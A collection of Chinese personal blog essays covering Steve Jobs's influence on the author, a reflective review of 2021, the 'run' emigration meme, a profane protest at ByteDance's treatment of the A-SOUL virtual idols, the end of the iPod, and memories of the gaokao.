当年，比起 iPhone 4S，我更喜欢我的 iPod classic，后者可以装下 40000 首歌，拥有无懈可击的数十小时续航，是一台能满足任何 music nerd 的「音乐仓」。而且它是乔布斯亲自发布的产品，是苹果「音乐 DNA」的象征。

今天再拿 iPod 和 iPhone 做比较，试图证明自己是某种「老果粉」，当然无趣。两款产品都深刻地改变了世界。iPhone 有数十倍于 iPod 的销量，但如果没有 iPod，苹果也无法积累足够的「移动设备开发经验」。

最后，iPod 改变了我听音乐的方式，iPhone 改变了我与世界连接的方式。

大部分人，与乔布斯从未谋面的人，被他「改变」，都是通过苹果产品。我也一样。

就像乔布斯自己说的：

One of the ways that I believe people express their appreciation to the rest of humanity is to make something wonderful, and put it out there. Because believing that the dots will connect down the road will give you the confidence to follow your heart, even when it leads you off the well worn path, and that will make all the difference.

我读完了大学。但某种程度上，我真正经历的「大学」，是在那四年里，追随自己的好奇心，研究一切我感兴趣的东西。苹果产品是其中重要的一部分，知乎是过程中一个主要的载体。这段经历定义了我。

散落的星星点点，最终连接成完整的人生版图。

-

工作之后，我开始用 Mac。

Mac 是乔布斯最初改变世界的伟大造物。它是一台优秀的个人电脑，但更重要的是，它是「工具」。

乔布斯将 Mac 比作「思想的自行车」。自行车与其他所有交通工具，最大的不同在于：你需要的仅仅是「一辆自行车」，无需汽油、电能，不依赖于任何设施、系统。

这是 Mac 最迷人的地方。它将先进的计算机技术，赋予「个人」。乔布斯相信这台电脑，能放大「个人」的奇思妙想，帮助他们创造点什么东西，甚至最终改变世界。

我用 Mac 写博客，做播客，处理照片，整理心情和记忆，管理账单、财报……作为工具，Mac 激发了我对「生活」、「创造」、以及「美」的热情。骑上这辆自行车，我就能走得更远。

Mac 之所以独特，区别于其他一切「电脑」，是因为乔布斯知道，只有技术是不够的，他说：

Technology alone is not enough. It’s technology married with liberal arts, married with the humanities, that yields us the result that makes our heart sing.

「科技与人文的十字路口」，这个概念既单纯，又复杂。那些追随乔布斯理想，拾级而上的学徒们，最终想要到达的，就是那个「交差点」。

当年负责组织翻译《乔布斯传》的出版人，Cris，创办了一本「聚焦科技与文化交汇处」的杂志，《离线》。我从 2016 年开始，所做的几乎全部工作，都源于这本杂志，源于与她的合作。

我和同为《离线》老编辑的林檎桑，一起做了一个名为「交差点」的播客。再后来，有人把我们所做的事情，称为「在那个十字路口站岗」。

十年过去，你很难说「科技与人文相结合」的理想，成为了主流。但这个十字路口依然热闹，愈发人丁兴旺。旅途中，不断有新朋友加入进来。

Apple4us 发起者，张亮说：

有个 00 后跟我说他知道 Apple4us。

-

在乔布斯去世十周年之际，我和同事们一起做了一个纪念视频。尝试从他的遗产里，提炼出一些东西。

所以过去一个月，我一直在思考：史蒂夫·乔布斯究竟留下了什么？

想要回答好这个问题，并不容易。我们回顾了乔布斯的一生，但直到我将视线从他身上挪开，开始审视自己的经历，我才发现，答案近在眼前。

10 年前的今天，我走入这个「没有史蒂夫·乔布斯的世界」。但在这 10 年的每一天，他都在改变着我的生活。

他改变了我听音乐的方式、连接世界的方式、工作与创造的方式、被动画电影打动的方式。他甚至改变了我穿的鞋：这双 New Balance 992，正是参考了乔布斯的意见，设计出的产品。

我走过的路，所做的事，信奉的价值，都与乔布斯有着密不可分的联系，我浑身上下，充满了受他影响的痕迹。

今天的我，可以轻松找到十条路径，通过「六度分隔」理论，「链接」到他。

与其说我们活在一个「没有乔布斯的世界」，不如说这是一个「已经被乔布斯改变过的世界」。

-

2005 年，在斯坦福大学毕业典礼的演讲末尾，乔布斯引述了那句醒世恒言：

Stay hungry, stay foolish.

这句话出自《全球概览》的最后一期，是编辑们向世界的发出的最后一句「告别」。

70 年代中期，青年时期的乔布斯读到这句话，决定踏上那条晨间的乡间小路，以「若饥若愚」的初心者姿态，拥抱前方的未知。30 年后，他将这一遗产，留给全世界。

又是十年过去，史蒂夫·乔布斯从未被遗忘，他的遗产也从未褪色，而是润物无声，恒久流传。

我感激这一切。
Source: 大破进击

**间奏曲**
间奏曲

2021，我们陷于危机。

这个说法或许不太公平，很多危机并不始于 2021。比如疫情，已持续一年时间，并非 2021 专属。

实际上，年初的我，几乎已经重燃起一种乐观精神。

这种乐观一方面来自资本市场。跨年之后，我最大的一笔股票持仓，BILI，价格一路飙升，很快突破了 100 美元。我的浮盈逼近 200%，很难说不是「大赚了一笔」。

另一方面，疫情结束的曙光，也从地平线那边亮起来。年初的时候，既没有 Delta，也没有 Omicron，疫苗蓄势待发。就连美国的每日确诊人数，也走过峰值，开始下跌。刚从上海过完圣诞节回来的我，心中重燃起希望的火苗。

-

但很快，生活就走入暗周期，糟心事扑面而来。

工作上不公平的对待、陷入瘫痪状态的家庭……生活的摩擦力越来越大，就像是顶着九级大风向前走。

整个春天，我的胸口就像被一块大石板紧紧压住，无可喘息。我的注意力很难集中，甚至出现了一些短期记忆丢失的症状：一抬手、一起身，就忘了自己要干什么。

3 月，Billie Eilish 在关于她的纪录片里说：

In life, we tend to do things and…we are always looking forward to the next thing. And this is happening right now. So why don’t we be in the moment?

去年一整年，我都在等待「疫情结束」。但时间经不起等待，明天的可能性，并不能回应当下的期愿。

「be in the moment」，是今年我改造自己的一个尝试。

我开始变得更随性，坑掉了玩到一半的游戏《牧场物语》，多次在电影院里看电影看到睡着，删除写不完的 blog，翘了不想上的班……跟朋友喝酒、吃饭，顺着自己的情绪流动，而不是总用理性压制它。

2021 年，我经历了很多个「情绪失控」的时刻，也终于意识到，它并不是敌人。你可以将感情诉诸于很多东西，无论是具体的人、物，虚拟形象，某件事、某个特定的时空坐标……它们都是你作为一个生命活过的证明。

一切都是真的。你哭过了、笑过了、付出过了、得到过了，才算是真的「活过」，它们塑造了你，让你成为真正的自己，一个更完整的人。

6 月，在三亚的海边，我把肩上的那些负担交给海浪。这大概就是 2021 的时代精神吧。从「奋斗有用」到「放弃有用」，我接受了那些不可逆转的结局，顺势入海。

You can fly unless you let yourself, let yourself fall.

-

一个说法是，2021 年是「失去的一年」。

的确如此，我失去了很多东西，其中最大的一个「坎」，当属父亲去世。

我试图用物质来进行一种「代偿」，换了全套的新 Mac、iPhone、Apple Watch……几乎每周都在拆各种新的电子产品，给新房子买了全套最好的电器，以及，买了一辆新车。

这显然解决不了任何问题：物质带来的满足，从来都是迅速递减的。

而且，新东西预示着新的开始。但过去两年，我们从未真正向前走。疫情冻结一切之后，我们只能通过各种 App 的「记忆功能」，重新品尝 2020 年以前「好时代」的滋味。

随着自己走入「中年危机」的深水区，这一问题变得愈发严重。今年，我时常失眠，躺在床上划手机，听过去的歌单，看过去的博客，刷视频网站的收藏，看那些看过无数遍的电影，摩挲记忆，直到天亮。

今年我拔了四颗智齿。拔完之后，医生说，有一颗智齿的一牙根断在里面了，强行拔怕伤到神经，就留在里面吧。当时我立刻想到了一个相当矫情的比喻：就像一场没分干净的恋爱。

这似乎隐喻了我们所处的时代：计划赶不上变化。演奏完上一篇乐章，已经没有乐谱供我们参看了，我们只能即兴演奏着一首间奏曲，音符之间，全是老掉牙的和弦。

2021 年，我愈发觉得，生活好像就是对过往的一种「复读」而已，终归是没什么新鲜的。deja vu 一波又一波涌现，就像今年最火的那首歌。

这是一种焦虑。未来一片黯淡，所以我们能做的，就只有尽力保留那些好的记忆。我们像害怕数据损坏一样，不断给过往「做备份」，不再为时间写入新的东西。

-

夏天，我进影院看了《情书》。

我完全不记得自己曾看过这部电影。或者说，我知道我看过，但早已忘干净了。唯一的线索，可能是我在豆瓣上给它打过分。

所以重看的时候，我也经历了一段和藤井树类似的体验：在时间的河流里回返，寻找那些记忆片段，重新翻开隐藏在背面的心情。

我想起来之前看它，是初中的暑假。而且很多细节都在我记忆里留下了深刻印象。比如「小樽」这个地名，比如黑板上值日生一栏的恶作剧。后来我玩 Galgame，每每遇到图书室这个场景就会勾起一些模糊的 deja vu。以及我经常梦见一个画面：用长焦镜头拍的，挤压严重的，冷色调的北海道小镇街道。

看完之后，我立刻觉得，这或许是一种更好的「回忆的体验」。放下一切负担，只是向前走，到了合适的时候，或许就会和过往，再次一期一会。

我们要做的，只是 be in the moment 而已。

-

2021 是复杂的一年。过往与未来，失落与希望，全部交织在一起，激烈起伏。这是一个二极管的时代，大部分人要么在吹，要么在黑。

什么「预期」都不存在了，前方只有满载的不确定性。谁都不知道疫情什么时候结束，中概股能不能回弹——还好我跑快了一点，才避免了吐掉所有浮盈的结局。

回顾这一年，一个最重要的关键词就是「危机」：工作的危机、家庭的危机、钱和身份认同的危机。

跟朋友形容最近半年的生活，就像是「顶着 18 个碗，一边开电话会，一边玩杂耍，一边倒立走钢丝。」

「听起来像一种『极限跑毒』，而且是没法打药的那种」，他说。

而且，这不是决赛圈。我很清楚，这不过是未来更渺茫人生中的一段间奏曲而已。

我们在迷雾中穿行，但下一曲终要奏响。

-

时隔两年，公园再次把 IF 办回了线下。

出差深圳，不免让我回想起 5 年前，2016 年的冬天，也是去深圳，甚至一起吃饭的人也是同样的老同学、老同事。

一切似乎是旧的，却又是全新的：跟新同事一起去了海边团建，走之前最后的早晨，万里无云。

2021 年的最后一天，新房的硬装终于全部结束，新的生活，就在眼前。

但这并不是最关键的，生活也绝不会因为住进新房子就完美无缺。

关键在于，我们能接受当下的缺憾，品尝它的美妙，而不是永远只沉湎于过去，寄希望于未来。

2021 这首间奏曲，到此告一段落。

そして、次の曲が始まるのです。
Source: 大破进击

**也谈润**
也谈润

「润」（run），一下火了。

我观察这类，带有强烈价值判断的词，到底有多火，有一个判断标准：当我身边那些「相对成长于温室，从小到大近乎无忧无虑」的女生，也开始讲这个词，就说明它真的火出圈了。

在「润」之前，上一个达成这一成就的词，是「卷」。

-

Lawrence Li 对「润」提出了一种批评意见，认为它不够「严肃」。

移民就移民，不要润（run）来润去的。

这个问题看似很小，但牵涉到的问题的切面却很多。随便列举几个：作为语言工具的使用主体，普通人有活用、创造语言的权利；在一个执行严格审查的社会里，语言必须不断变态，才能寻找生存空间……

我同意「中文语言工具箱里，缺少属于普通人的严肃语言」，也同意「『梗』是普通人对语言的积极改造」。

这不是「润」这一个词的问题，也不是我今天想谈的东西。

我想说：「润」，从来不只有「移民」这一层意思。

-

我很早就信奉「润」的精神。

比如整个学生时代，英语都是我相对最有优势的科目之一。中学时代，我一度把留学、移民当作一条完美的，终极人生解决之道。

但很显然，今天谈「润」的语境，早已和以往逃荒的时代，有了巨大差别。所以才会有人说，「润」适合有钱人和一穷二白的人，对中产阶级来说，想要放弃一切重新开始，是最难的。

确实，对大部分人来说，我们追求的那个 “I made it” 的人生节点，并不会因你一脚踏上某个发达国家的土地就实现。

我最终没能按中学时的计划成功「润」掉。讽刺的是，当年很多不遗余力反对我「润」理论的同学，都身体力行地「润」了。

只不过，「润」也从未成为他们生活的终点，最近，不止一个在硅谷大厂工作的朋友在做辞职环游世界的计划。

也就是在这个过程中，我意识到，「润」的精神内核，从来不是「移民」那么单纯。大家都说「太平洋没加盖」，但绝不存在一种平行宇宙：所有对生活不满意的人，都通过移民，解决了自己的问题。

-

「润」真正的精神内核，正如其字面意思所说，是逃，是放弃，是离开。

但问题的关键不在于「逃离」这个动作本身，而在于接下来，你要做什么。

2017 年，我受不了大城市高压的生活，决定「润」回老家。再后来，我开始了解到「数字游民」的生活方式，便一点点把远程工作变成了生活的常态。

在新冠时代降临之前，我已经穿行于世界，在任何能落脚的地方工作：其中既包括涉谷的咖啡馆，也包括西海岸的某条公路。

我找到了一条路径，只要我把工作做得好一点，我就可以获得一种完整的「游民生活」，可以在清迈、里斯本、火努努鲁、东京、纽约工作……不移民，也润向全世界。

时至今日，如果不是因为新冠病毒，单纯从经济层面说，我已经有了足够的资本，支持我以游民的方式生活。

身处这样一个新冠时代，的确令人焦虑又失落，但我仍觉得前方有一条路径，能让我最终实现自己想要的生活。

我仍然在「润」的路上。

-

《火影忍者》里，自来也有一句名言：真正的忍者，是指可以忍耐一切的人。

放在今天的社会里，真正的「润」者，就是不忍耐一切的人。

我不会甘心于 996，不会甘心于租住 10 平的单间，不会甘心于让自己的小孩成长于这样的社会，不会甘心于让我的想法就烂在肚子里……

所以我想办法逃离，想办法改变，尽全力挣扎。

这，就是我的「润」道。
Source: 大破进击

**字节跳动，我日你先人。**
字节跳动，我日你先人。

2013 年，NHK 的纪录节目《纪实 72 小时》，拍摄制作了一期关于地下偶像的纪录节目《地下偶像的青春》。

片中，扎根秋叶原的小众偶像团体，在位于地下室的简陋场地里公演，跟粉丝互动。她们中的大部分，都过着「N 个人挤住在一间小房子里，自己在窗台上种豆苗当蔬菜吃」的贫困生活。

这些人气不高的地下偶像，月收入只有 10 万日元（5000 人民币）左右。这个数字在东京，只相当于基层餐厅服务员、便利店店员月收入的一半。

一切都是为了追梦。这个「梦」，一方面是自己借此成名，进入上层「艺能界」的梦；另一方面也是台下粉丝，为喜欢的偶像应援，甚至送她们「正式出道」的梦。

但梦，大部分时候，都只是梦而已。绝大多数地下偶像，都永无出头之日，她们没有优越的「软硬件条件」，有的只是最简单粗暴的「年龄优势」——很多团体的平均年龄都不到 20 岁，很快就会被后来的，更年轻可爱的偶像冲刷下去。

2014 年，我一次看了这集纪录片。当时的我，正疯狂迷恋 AKB48 和 LoveLive!，两者分别是真人和虚拟领域，最当红的偶像企划。对我来说，是《地下偶像的青春》这部纪录片，让我了解了偶像产业背后，鲜为人知的暗面。

-

作为一种演出介质，「偶像」并没有什么特别深刻的内涵，甚至可以说，它就是一种以「青春」为原料的快餐。

从握手会到总选举，AKB 找到了一套「粉丝参与偶像活动，甚至决定偶像未来」的机制，拉近两边的距离。但无论如何，粉丝的生活，和偶像的生活，仍是两条离散的线，只交汇在公演、唱片、周边……少数的几个点上。

大学毕业之后，我也逐渐从饭偶像的生涯里毕业。我看过了这个领域里所有的套路，大部分「表演」，已经无法再挑动我的神经了。

所以，当 VTuber 的风潮袭来，A-SOUL 出道，我都从未关心过。我经历过偶像的战国时代、直播生放送起飞的时代，更懂「一万关注能换算成多少价值」的粉丝经济。把它们结合一下，资本砸点钱，有什么稀奇的？

包括我其实很早就听说了嘉然的「吃面神回」，但内心毫无波动。

只是又一个假装能和粉丝稍微共情一下的偶像而已，对吧？就像所有的偶像都有「恋爱禁止条款」但仍然会被「文春炮」一样，谁知道真假呢？

再说了，不会有人以为小作文就是真的吧？

-

跟我有类似想法的 AU，不在少数。大部分人应该都知道，A-SOUL 刚出道时，被辱骂淹没的状态。毕竟这个企划本身，从设定到执行，包括所谓的「动捕技术」，不说多差多垃圾，只能说屁用没有。

但就是这样的辱骂，给了 A-SOUL 一次重生的机会。或者说，给了粉丝和中之人一次再造 A-SOUL 的机会。

后来，当我再观察 A-SOUL 的走红轨迹，发现它和 AKB48 有着惊人的相似之处。

当年 AKB48 开创性发明了握手、打投，让粉丝参与到偶像活动里来。而 A-SOUL 和 AU，则是通过偶像接收观众的反馈，调整内容，粉丝又回馈以各种二创、引流、弹幕互动，整出了属于 A-SOUL 的好活。

过程中，最不可或缺的，就是中之人对粉丝，特别是底层鼠鼠观众的理解和共情。回顾那些经典语录，从「你们是在跟 sc 聊天还是跟然然聊天」，到吃面回让观众好好吃饭……然然之所以成为「圣嘉然」，就是因为她把理解和共情，撒向了所有的观众，而从不只局限在送礼物的老板。

偶像生态，粉丝天然有阶级之分。早在 AKB 时代就是这样，你投 10 张专辑，我就投 100 张专辑，那我自然贡献比你大 10 倍。握手券更是这样，买的越多，抽到握手机会的概率就越高，抽到越多，握的时间就越长。一切都可以用真金白银来衡量。

但在 A-SOUL 生态里，粉丝阶级被最大程度地消弭了。不管你是在弹幕评论整活，还是到处引流，写小作文，做二创，大家都只是怀揣着最简单的热情投入其中，偶像和粉丝，互相回应彼此沸腾的期待。

-

结果，粉丝之间是没有阶级了，反而是企划内部有阶级，而且是以最恶劣的方式在压榨。

从昨晚到今天爆出的所有事情，你们自己去看吧，我不想复述了。

我们都以为直播是整活，以为向晚买一个 OLED Switch 都要攒钱是假的；以为珈乐手机坏了舍不得换是假的。我太懂粉丝经济了，不会真有人以为一个个几十万几百万粉丝的，差这点钱吧？

再说了，这个企划背后可是字节跳动啊？给应届生都能开出 50w 大包的宇宙条啊？

但一切都是真的。嘉然穿 100 多的裙子、用 2000 多的手机是真的，珈乐手机坏了，连扫地铁都不好用是真的。她们奉献自己的青春，做到行业天花板，还把天花板捅了个窟窿，最后沦为字节跳动畸形制度，朝夕光年团队内斗的牺牲品。

这些事情，作为一个科技行业的「业内人」。我初听觉得震惊，但仔细一想，又只能说实在合理。

对字节跳动来说，「技术」当然大于「人」。毕竟中之人又不能规模化，又不能成为「大中台」的一部分，不能 Ctrl C、V 成无数个虚拟偶像，开 10000 个直播间，24h 不间断划拉钱？凭什么开高薪？

字节跳动不止剥削了她们的青春，还把她们的身体往死里压榨，用一身伤病，换来观众眼里的「成长」，最后变成日报、周报，成为项目组负责人向上邀功请赏的材料。

而实际上，字节跳动已经在尝试做纯 AI 的主播，连「中之人」都不需要了。没想到吧，它不只生产虚拟的皮，还要生产虚拟的魂。至于「中之人」，就成为技术发展过程中，一块用来垫脚的阶梯吧。

谢谢你，字节跳动，让我看到了中国版地下偶像的残酷青春物语。什么圣嘉然，都只是披着伪神包皮的献祭品罢了。在那个 AI 和算法统治眼球，人人被无限月读的未来里，只有张一鸣，是永远的真神。

-

我之所以写这件事，不是因为 5 个女孩，在杭州做着非常辛苦的工作，拿一万块钱这种极不公平的低薪，这件事本身有多么恶劣。

我们都知道，在这个社会上，还有更广阔的底层，活得更艰难、更痛苦。

但一切都不应该是这样的：恶劣的工作制度压榨女孩们的青春；真正的创作者反而无法成为作品的主人；基于算法的投喂大于人与人之间真实的共情……不应该是这样的。

对字节跳动内部很多员工来说，他们的目光或许从未落在 A-SOUL 身上，他们关心的事情，可能更多是押注「元宇宙」概念，让公司市值突破 4000 亿美元，是升职、加薪、拿期权、财务自由……

但我真的很想说一句，赚那两个 b 钱，其实也挺没意思的，远不如你理解了嘉然为什么吃面有意思。我身边那些混得人模狗样像，但内心无比空洞的小雅痞太多了。很多从小学习好，顺利取得世俗成功的人，最终最缺的还是爱与理解。

包括跟郭宇在推特上也互相关注有一段时间了，关于财富自由没法带来幸福这件事，我可能真的比你懂一点。

做个人，活生生的人，是最重要的，也是最好的。
Source: 大破进击

**iPod 时代终结，但音乐没有告别**
iPod 时代终结，但音乐没有告别

（本文首发于极客公园，本站收录时进行了修改。）

走过 21 年，iPod 终于走到了它的终点。

5 月 10 日，苹果发布公告，宣布「iPod touch 库存有限，售完即止」，正式将 iPod 从产品序列里清除。

在一些老用户眼里，iPod touch 并不是一台「正宗」的 iPod，因为与其说它是一个「音乐随身听」，不如说它是一台「不能打电话的 iPhone」。

所以，关于 iPod 的时代到底于何时终结，存在多种见解：有人认为是 2014 年，苹果停产 iPod classic，配备「触控转盘」（Clickwheel）的正统 iPod 不复存在；也有人认为是 2017 年，最后一代 iPod nano 和 shuffle 停产，作为「随身听」的 iPod 谢幕。

这一次，苹果自己，正式为 iPod 的时代画上了一个句号。在官方新闻稿里，苹果用了一个颇具情怀的标题：音乐生生不息。

传奇开端

iPod 的故事，始于乔布斯的一个想法，他想探索一个「新的领域」。

上世纪 90 年代末，折腾了 20 多年电脑，经历巅峰低谷，离开苹果又回归的乔布斯，想「搞点新东西」。

2001 年 10 月 23 日，乔布斯站在一个不大的室内舞台上，向媒体、观众宣布，苹果将进入「音乐」领域，发布一个「音乐播放器」。

至于原因，乔布斯解释得非常简单，「我们热爱音乐，而且音乐是每个人生活的一部分。」一系列讲解后，他从口袋里拿出了那台名为 iPod 的机器，开启了 iPod 的时代。

作为一款「随身听」，iPod 有三个「开创性」的功能特点。

第一，iPod 使用「硬盘存储」。初代 iPod 配备了 5GB 容量的机械硬盘，可以装下 1000 首歌。这个容量在 2001 年，可以说大得夸张。与 iPod 同时代的 iBook 笔记本电脑，也仅配备了 10GB 硬盘而已。

第二，苹果为 iPod 设计了「触控转盘」（Clickwheel）。当用户浏览 iPod 里存储的几百首歌时，不需要一直按某一个按钮去翻页，而是只要用手指转动转盘就行了，转动速度决定了翻页的速度。这个交互方式，起源于苹果做笔记本触摸板的经验，在当时，无比优雅地解决了在大曲库里「找歌」的难题。

第三，iPod 配备了苹果的 FireWire 高速接口。通过 FireWire，iPod 不仅可以实现比当时的 USB 标准快 30 倍的传输速度，还可以通过这一个接口，同时实现传输数据和充电。这在当时也是一个非常前卫的设计。

一切都是为了实现一件事：把你的整个音乐库装进口袋，带到世界的任何地方。

为了实现这件事，iPod 还采用了和电脑「同步」的歌曲管理方式。要把歌曲导进 iPod，你必须先把歌放进电脑的 iTunes 里。

这个逻辑让国内很多早期用户都觉得 iPod「难用」、「麻烦」，不像很多 MP3 播放器，插上电脑，把文件拖进去就行了。

但乔布斯显然有自己的思考。在 2001 年的美国，大部分用户消费音乐的方式是买 CD。通过 iTunes，用户可以把 CD 里的数字音乐文件拷进电脑，进行管理。这个前提下，大部分用户的音乐库、包括歌单，其实已经在 iTunes 里了，插上 iPod，一键同步，是最方便的。

而且，乔布斯对「从网上下载盗版音乐」这件事深恶痛绝，就像他说的，做 iPod 的初衷是「热爱音乐」。所以，当他做了一个以「硬盘」为存储介质的播放器时，他最怕的，就是用户利用 iPod 的便利，听盗版音乐。

所以苹果还限制了用户，只能把歌曲从电脑同步进 iPod，但不能从 iPod 拷贝到电脑。早期的 iPod，在包装上，都会用四国文字显著告知用户「不要盗窃音乐（Don’t steal music.)」。

当时的苹果，其实只靠硬件赚钱，用户用 iPod 听盗版，并不会对苹果造成什么损失，但乔布斯依然坚持了这个选择。

发布后，iPod 一炮而红。之后，基于初代的设计，苹果一共推出过 6 代 iPod。2007 年发布的最后一代被命名为 iPod classic，最高配备 160G 硬盘，可以装下 40000 首歌，被一代乐迷奉为经典。

把 iPod 做小

初代 iPod 发布后，苹果立刻开始探索一件，在当时看来没什么稀奇，但影响非常深远的事：把 iPod 做小。

从 2004 年开始，苹果连续发布了 2 代 iPod mini，7 代 iPod nano，4 代 iPod shuffle，他们的最大共同点就是「小」，越来越小。

把 iPod 做小并不是一个很难理解的事情：这是一个「随身听」，只有越轻越小，用户携带起来才更方便。而且，也正是那段时间，芯片技术飞速发展，iPod 的性能越来越强，功能越来越多。

从功能出发，苹果几乎每年都会拿出一个新设计，比如配备长方型屏幕，方便用户横过来看视频的 5 代 nano；以及小到极致，全身没有一个按钮，用户需要通过耳机线控操作的 3 代 shuffle。

过程中也有过一些，有趣的高光时刻。2005 年，乔布斯发布第一代 iPod nano 时，为了体现它有多小，把它装进了牛仔裤口袋上方的「小口袋」里。

早年间，这个小口袋原本是用来装怀表的。后来怀表过时，这个口袋却作为一种经典设计保留下来，大部分人都不知道它有什么用。所以，当乔布斯在发布会上，从这个小口袋里掏出 iPod nano 时，引发了现场观众的大笑和掌声。

今天再回顾这段历史，你会发现，即便是苹果，常年被诟病设计「一成不变」的苹果，也在不断地探索新设计，新工艺。技术、产品、设计，都在频繁的迭代中飞速发展。iPod mini、nano 和 shuffle，成为了苹果开发团队操练的游乐场。

而这段历史，对苹果之后的产品开发，产生了深远影响。

可以说，正是因为苹果做了 iPod，开发过程中积累了做小主板、移动应用、电源、储存管理，这一系列的移动开发经验，才为后来开发 iPhone 打下了基础。

包括设计和工艺，也是因为苹果在 iPod nano、shuffle 上做了一体式的全铝外壳、金属中框，积累了 CNC 削切工艺的经验、有了行业沉淀，才有了后来铝制一体机身的 Mac、iPhone。

就连 Apple Watch，最早的原型，也是基于 iPod nano 6 做的。当年的 iPod nano 6，配备的正是一块小小的方形触屏，苹果还推出了配套的表带，让用户可以将它戴在手上。

2007 年，在那场改变历史的 iPhone 发布会上，乔布斯走上舞台，说：「今天，我们要发布三个新产品，一个 iPod、一个手机、一个互联网通讯设备」。这三个定义合在一起，就是 iPhone。

iPod 和 iPhone，两者同为「移动设备」，有着无比紧密的联系，最终造就了今天的苹果。当年 iPhone 发布后，考虑到它相对高昂的售价，苹果火速推出了一款，让用户「能以更低成本体验 iPhone」的产品：iPod touch。

功能上，iPod touch 几乎就是一台不能打电话的 iPhone。因为硬件高度相似，当年甚至出现过通过外挂通讯基带+破解系统，实现让 iPod touch 变身 iPhone 的「苹果皮」。

正是在 iPod touch 上，很多人第一次感受到了「多点触控」和 iOS 的魅力，它也成为了很多人「入坑苹果」的第一站。

发布 15 年后，iPod touch 的确完成了自己的历史使命。今天，如果你想要以较低成本体验 iPhone，有包括 iPhone SE 在内的诸多选择。

所以，苹果终于为 iPod touch，也为 iPod，划上了一个句号。

音乐生生不息

iPod 时代落幕，不少老用户都在社交媒体上表达怀念、遗憾。但无论如何，就像苹果新闻稿的标题所说：音乐生生不息。

2015 年夏天，苹果推出了 Apple Music 流媒体服务。Apple Music 有一个非常重要的「iCloud 音乐库」功能，为 iPod 用户提供了一节，通往互联网时代的列车。

还记得 iPod 必须跟 iTunes 的「音乐库」同步才能导入歌曲吗？Apple Music 的「iCloud 音乐库」功能，可以把你的 iTunes 音乐库，包括所有的歌单、收听记录、打分，整个上传到 iCloud 上。

完成上传后，你的所有苹果设备，都相当于内置了一个 iPod。

你可以用 iPhone、Apple Watch，连上 AirPods 听；工作时用 Mac、iPad、PC 听；在车上可以连着 CarPlay 或车载蓝牙听；在家可以在 Apple TV、HomePod 上听……

很多人会怀念学生时代，用 iPod，跟朋友一人一只耳机，分享音乐的体验。而在 iOS 14 上，你可以用一台 iPhone，连接两个 AirPods，实现非常类似的体验；iOS 15 还加入了 SharePlay，你们都不需要在同一个地方，也可以听同一首歌。

以及还有人会怀念用 iPod classic 的模拟音频输出，接上一个耳机放大器，听 Hi-Fi、无损的体验，而现在，Apple Music 也已经在提供最高 192KHz 的无损音乐。

当然，说得再多，iPod 都代表了一个时代，一段特定的记忆，在我们心中有着一种象征性的，不可或缺的地位，不会轻易被 Apple Music 取代。但无论如何，如果你还在意音乐，还愿意认真听音乐，它都在那里。

而且，音乐从来也不局限于苹果这一家公司的设备、服务。近几年，苹果也在将更多东西，开放给其他的公司。比如你已经可以用 Siri 控制播放 Spotify 了，在 HomePod 上也可以听 QQ 音乐和网易云了。

就像乔布斯 2001 年说的，「音乐是每个人生活的一部分」，它确实生生不息。

回顾流行音乐诞生、发展的历史不难发现，这是一种和技术深刻捆绑的艺术形式。在流行音乐诞生之前，古典音乐只能在现场表演，是只属于社会顶层贵族的稀缺品。

上个世纪 40 年代，因为黑胶唱片的兴起，音乐开始被大规模复制、传播，流行音乐也因此诞生。流行音乐出现后，相关技术开始进入一个大发展时期。

当年乔布斯之所以想做 iPod，其中一个关键原因，是因为他很喜欢索尼的 Walkman；而发明 Walkman 的传奇工程师深井大，又是为了随时随地能听他最喜欢的歌剧唱片，才想做一个便携的磁带随身听。

从留声机到 Walkman，从磁带到 CD，再从 iPod 到互联网服务，一代又一代热爱音乐的人们，就像「盗火者普罗米修斯」，用名为技术的火把，传递音乐。

从这个角度去说，iPod 的终结并非「死去」，它完成了那个传递火种的任务。在它诞生 21 年后的今天，音乐比以往任何时候都要无处不在，生生不息。
Source: 大破进击

**我的高考**
我的高考

今年高考出成绩了。

知乎上有相关提问刷上首页，但我并不关心高考本身。我三代内的近亲，都已脱离了这片「苦海」。一转眼，我的高考也已经是 10 年前的事了。

从小到大，我的学习成绩一直在「稳步下滑」。高中有一次，班主任老师把我叫到办公室，拿我高一入学时的同桌跟我做比较，说我们入学考试成绩是如何接近，后来我又如何被甩开很远。

-

整个学生时代，相比「期盼考好」，我更多时间都在「恐惧考砸」。

比如小学时，我完全不记得哪次期末考了全满分感到开心，而唯独对一次小考语文 89 分记忆犹新。

那是我上学以来第一次考试没上 90 分，我坐在教室第四组的第二排，拿着那张试卷，脑子一片空白，想着要如何把试卷拿回家给父母签字。尽管后来他们并没有对这个成绩过分追究，但那个看卷子的瞬间，就是被写进了深度记忆的扇区里。

再往后，中学时代，我恐惧的事变成了「考不上一中」和「考不上一本」。这种恐惧在初中时表现得更为具体：每次考数学，只要碰到求解有一点困难的题，我就会出现应激性的腹泻症状。中考的两天更是因为哮喘，中午还在诊所挂水。

用一句话概括我的校园生活就是：如何尽量保持成绩在一个合理区间的下缘，不掉下去，然后挤出更多时间玩。

这里的「玩」，包括进网吧，看小说，唱 KTV，玩桌游，跟在要去打群架的朋友后面壮声势，和同桌上课比谁憋气憋得更久……

这种状态在高中阶段，被推向高潮。整个高中，我把「摸鱼」理念贯彻到了极致：上课看杂志、跟同学聊天，课间午休看美剧。晚上也不写作业，而是刷微博、逛贴吧。

听起来跟我现在的工作状态完全一致。唯一的区别是，现在刷社交媒体，一定程度上还能帮你把稿子写出来；但那时，逛再多贴吧，也不可能搞清楚氯化铁混氯化亚铁的除杂方法。

高三的时候，每周四都会搞理综模拟。我最差的科目，是需要花大量时间去记、背的化学。就是在每一次考砸的恐惧中，我才逼迫自己，稍微学一点，再学一点。

所幸的是，虽然每一次都并不踏实，有点勉强，但我还是一次次「蒙混过关」了，无论是中考还是高考。

十年前的那个初夏，很多同学都带着眼泪从考场里走出来，但我觉得并没有那么糟，毕竟高考那两天，天气是真的很好，风吹过来清新凉爽。

至于成绩，「会做的都做完了，考个一本应该还是可以的吧？」

-

在很多人，特别是家人眼里，我因为学习不够认真，错过了改变人生和命运的机会。

成年之前，几乎每个阶段，我身边都会有一两个成绩跟我差不多的朋友，比如班主任拿来和我比较的同桌。而他们后来的学业之路，几乎每一个都比我走得更高更远。高考考到 TOP 985 的，硕博申到藤校的……

只有我，花了 10 年时间，从「伪好学生」的光环中走出来，不装了，放开手脚玩。

记得王诺诺以前写过一个文章，说自己是「学酥」：看似学霸，一碰全是渣。对我来说，不用努力支棱着成为「学酥」，就是我的「长大成人」。

